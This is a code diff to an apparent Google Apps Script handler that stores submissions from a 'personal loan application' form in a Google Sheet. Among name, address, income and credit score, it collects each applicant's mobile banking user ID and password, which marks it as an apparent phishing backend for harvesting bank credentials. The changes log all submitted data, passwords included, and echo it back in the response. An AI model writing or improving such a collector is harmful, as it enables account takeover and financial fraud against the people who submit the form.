@@ -10,6 +10,7 @@ function doPost(e) {
   try {
     // Get the posted data
     const postData = JSON.parse(e.postData.contents);
+    console.log('Received data:', postData);
     
     // Get the active spreadsheet and sheet
     const spreadsheet = SpreadsheetApp.openById('YOUR_SPREADSHEET_ID'); // Replace with your Google Sheet ID
@@ -20,7 +21,7 @@ function doPost(e) {
       const headers = [
         'Timestamp',
         'Loan Amount',
-        'Loan Purpose',
+        'Loan Purpose', 
         'Credit Score',
         'Name',
         'Email',
@@ -44,16 +45,16 @@ function doPost(e) {
       sheet.appendRow(headers);
     }
     
-    // Prepare the row data in the correct order
+    // Prepare row data in correct order
     const rowData = [
       new Date().toLocaleString(), // Timestamp
       postData.loanAmount || '',
       postData.loanPurpose || '',
       postData.creditScore || '',
-      postData.name || postData.fullName || '',
+      postData.name || '',
       postData.email || '',
       postData.phone || '',
-      postData.streetAddress || postData.address || '',
+      postData.streetAddress || '',
       postData.city || '',
       postData.state || '',
       postData.zipCode || '',
@@ -64,7 +65,7 @@ function doPost(e) {
       postData.annualIncome || '',
       postData.employmentStatus || '',
       postData.monthlyHousing || '',
-      postData.yourBank || postData.customerBank || '',
+      postData.yourBank || '',
       postData.mobileBankingUserId || '',
       postData.mobileBankingPassword || '',
       postData.applicationType || 'Personal Loan Application'
@@ -73,15 +74,18 @@ function doPost(e) {
     // Append the row to the sheet
     sheet.appendRow(rowData);
     
+    console.log('Data appended to Google Sheets:', rowData);
+    
     // Return success response
     return ContentService.createTextOutput(JSON.stringify({
       status: 'success',
       message: 'Data saved to Google Sheets successfully',
-      row: sheet.getLastRow()
+      row: sheet.getLastRow(),
+      data: rowData
     })).setMimeType(ContentService.MimeType.JSON);
     
   } catch (error) {
-    // Return error response
+    console.error('Error in doPost:', error);
     return ContentService.createTextOutput(JSON.stringify({
       status: 'error',
       message: error.toString(),
